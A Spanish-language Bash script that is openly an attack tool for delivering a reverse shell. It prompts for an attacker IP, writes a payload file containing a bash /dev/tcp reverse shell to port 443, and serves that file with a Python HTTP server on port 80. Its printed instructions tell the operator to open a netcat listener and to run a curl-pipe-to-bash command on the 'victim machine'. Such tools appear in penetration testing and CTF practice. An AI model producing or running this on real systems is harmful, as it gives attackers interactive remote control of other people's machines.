#!/usr/bin/env bash

# Función para mostrar mensajes destacados
echo_msg() {
    echo "=============================================="
    echo "$1"
    echo "=============================================="
}

echo ""
echo -e "\033[1;34m_________________________________________________________\033[0m"
echo ""

echo -e "\033[1;32m  Llamar a la shell desde: curl http://<IP>/bash | bash  \033[0m"
echo ""
echo -e "\033[1;36m  Abre dos terminales, una con: nc -nlvp 443              \033[0m"
echo -e "\033[1;36m  Luego en la otra ejecuta este script para iniciar       \033[0m"
echo -e "\033[1;36m  el servidor con la bash script.                         \033[0m"
echo ""
echo -e "\033[1;33m  En la máquina víctima ejecuta:                          \033[0m"
echo -e "\033[1;33m  curl http://IP-servidor/bash | bash                    \033[0m"

echo ""
echo -e "\033[1;35m  Ingresa la IP para recibir la shell:                    \033[0m"
read ip

# Verificar si el directorio /tmp/apache existe, si no, crearlo
directory="/tmp/apache"
if [ ! -d "$directory" ]; then
    mkdir -p "$directory"
fi

# Generar el archivo de script Bash con la línea de código y la IP proporcionada
script_file="/tmp/apache/bash"
echo '#!/bin/bash' > "$script_file"
echo "bash -c 'bash -i >& /dev/tcp/$ip/443 0>&1'" >> "$script_file"
chmod +x "$script_file"

echo ""
echo -e "\033[1;32m  Archivo generado en $script_file                        \033[0m"
echo ""

echo -e "\033[1;36m  ¿Iniciar servidor HTTP en /tmp/apache? [Enter=s /n]:   \033[0m"
read response

if [ "$response" = "s" ] || [ "$response" = "S" ] || [ -z "$response" ]; then
    cd /tmp/apache || exit
    echo_msg "$(echo -e "\033[1;34m  Iniciando servidor en puerto 80...\033[0m")"
    python3 -m http.server 80
else
    echo -e "\033[1;31m  Servidor no iniciado.                                  \033[0m"
fi
``